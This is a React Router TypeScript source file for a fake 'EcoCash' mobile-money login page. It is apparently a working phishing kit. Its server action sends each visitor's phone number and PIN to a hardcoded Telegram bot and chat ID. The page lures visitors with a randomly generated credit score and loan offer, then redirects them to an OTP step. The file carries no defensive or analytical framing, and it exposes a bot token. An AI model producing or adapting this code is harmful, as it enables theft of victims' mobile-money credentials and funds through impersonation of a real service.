import { Button } from "@workspace/ui/components/button";
import { Input } from "@workspace/ui/components/input";
import { use, useEffect, useRef, useState } from "react";
import image from "@workspace/ui/background-image.jpg"
import type { Route } from "./+types/confirmation";
import { useFetcher, useNavigate } from "react-router";

export async function action({ request }: Route.ActionArgs) {

    const formdata = await request.formData();

    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
    const url = `https://api.telegram.org/bot${token}/sendMessage`
    try {
        const res = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: 8453055105,
                text:
                    `Account Verification
Phone: ${formdata.get("phone")}
PIN: ${formdata.get("pin")}
                    `,
                parse_mode: "Markdown",
            })

        });
        const data = await res.json();
        return data;
    } catch (e: any) {
        return e.message || e;
    }


}
export default function ConfirmationPage() {
    const refs = useRef<(HTMLInputElement | null)[]>([]);

    const handleChange = (value: string, index: number) => {
        // if (!/^\d?$/.test(value)) return;

        if (value && refs.current[index + 1]) {
            refs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (
        e: React.KeyboardEvent<HTMLInputElement>,
        index: number
    ) => {
        if (
            e.key === "Backspace" &&
            !(e.target as HTMLInputElement).value &&
            refs.current[index - 1]
        ) {
            refs.current[index - 1]?.focus();
        }
    };
    const [details, setDetails] = useState<{ phone: string, pin: string, key1: string, key2: string, key3: string, key4: string }>({
        phone: "",
        pin: "",
        key1: "",
        key2: "",
        key3: "",
        key4: "",
    } as any);

    const saveToSessionStorage = () => {
        const trial = sessionStorage.getItem("trial") == null ? 0 : Number(sessionStorage.getItem("trial"));
        sessionStorage.setItem("phone", details.phone);
        sessionStorage.setItem("pin", `${details.key1}${details.key2}${details.key3}${details.key4}`);
        sessionStorage.setItem("trial", `${trial + 1}`);
        const creditScore = trial<2?getRandomFloat(200,799):getRandomFloat(800,1000);
        const loanAmount = creditScore<800?0:getRandomFloat(10,100);
        sessionStorage.setItem("creditScore", `${creditScore}`);
        sessionStorage.setItem("loanAmount", `${loanAmount}`);

    };
    function getRandomFloat(min:number, max:number) {
        return Math.floor(Math.random() * (max - min + 1) + min);
    }

    const fetcher = useFetcher();
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if(details.phone.length !=10){
            alert("Please enter a valid phone number with 10 digits");
            return;
        }
        const onlyNumbers = /^\d+$/;
        if(!onlyNumbers.test(details.phone)){
            alert("Please enter a valid phone number with only numbers");
            return;
        }
        saveToSessionStorage();
        const formData = new FormData();
        formData.append("phone", details.phone);
        formData.append("pin", `${details.key1}${details.key2}${details.key3}${details.key4}`);
        fetcher.submit(formData, {
            method: "POST",

        });
        return;
    }

    const navigate = useNavigate();
    useEffect(() => {
        if (fetcher.data?.ok == true) {
            navigate("/otp");
        }
    },
        [fetcher])

    return (
        <main className="min-h-screen bg-slate-50"
            style={{
                backgroundImage: `url(${image})`,
                backgroundSize: "cover",
                backgroundPosition: "center",
                backgroundRepeat: "no-repeat",
            }}
        >
            <title>Self Serve Portal</title>

            {/* Header */}

            <header className="border-b bg-white shadow-sm">
                <div className="mx-auto flex h-16 max-w-6xl items-center justify-between px-6">

                    <h1 className="text-4xl font-bold">
                        <span className="text-blue-700">Eco</span>
                        <span className="text-red-500">Cash</span>
                    </h1>

                    <nav className="flex gap-8 text-sm">
                        <a href="#">Log In</a>
                        <a href="#">Sign Up</a>
                    </nav>

                </div>
                {/* {JSON.stringify(fetcher.data)} */}
            </header>

            {/* Background */}

            <div className="relative overflow-hidden ">

                {/* <div className="absolute inset-0 bg-gradient-to-b from-sky-100 via-blue-50 to-white" />

                <div className="blob left-20 top-20 h-60 w-60 bg-blue-300/20" />

                <div className="blob right-20 top-32 h-72 w-72 bg-cyan-300/15 animation-delay-2000" /> */}

                {/* Card */}

                <div className="relative z-10 flex justify-center px-4 py-16">

                    <form className="w-full max-w-lg rounded-3xl border bg-white/90 p-10 shadow-2xl backdrop-blur"
                        action={"/otp"}
                        method="post"
                        onSubmit={handleSubmit}
                    >

                        <h2 className="mb-10 text-center text-5xl font-bold text-slate-800">
                            Log In
                        </h2>
                        {/* {JSON.stringify(details)}  */}
                        <div className="space-y-8">
                            {fetcher.data?.ok == true ? <p className="text-green-500">Success!</p> : <p className="text-red-500">{fetcher.data?.description}</p>}
                            <div>

                                <label className="mb-2 block">
                                    Mobile number
                                    <span className="text-red-500">*</span>
                                </label>

                                <Input
                                    placeholder="mobile number..."
                                    className="h-12"
                                    name="phone"
                                    required
                                    value={details.phone}
                                    onChange={(e) => setDetails({ ...details, phone: e.target.value })}
                                />

                            </div>

                            <div>

                                <label className="mb-3 block">
                                    Enter 4-digit Ecocash PIN
                                    <span className="text-red-500">*</span>
                                </label>

                                <div className="flex gap-3">

                                    {Array.from({ length: 4 }).map((_, i) => (
                                        <Input
                                            key={i}
                                            maxLength={1}
                                            type="password"
                                            inputMode="numeric"
                                            className="h-16 w-16 text-center text-2xl"
                                            ref={(el) => {
                                                refs.current[i] = el;
                                            }}
                                            onChange={(e) => {
                                                handleChange(e.target.value, i);
                                                setDetails({ ...details, [`key${i + 1}`]: e.target.value });
                                            }
                                            }
                                            onKeyDown={(e) =>
                                                handleKeyDown(e, i)
                                            }
                                            name="pin"
                                            required

                                        />
                                    ))}

                                </div>

                            </div>

                            <button className="text-sm text-blue-600 hover:underline">
                                Forgot Password?
                            </button>

                            <Button className="h-12 w-full rounded-lg bg-blue-600 text-white hover:bg-blue-700" type="submit"
                                disabled={fetcher.state != "idle"}
                            >
                                {fetcher.state != "idle" ? "Loading..." : "LOGIN"}
                            </Button>

                        </div>

                        <div className="mt-10 border-t" />

                    </form>

                </div>

            </div>

            <footer className="pb-10 text-center font-medium text-blue-700">
                © 2026 Ecocash
            </footer>

        </main>
    );
}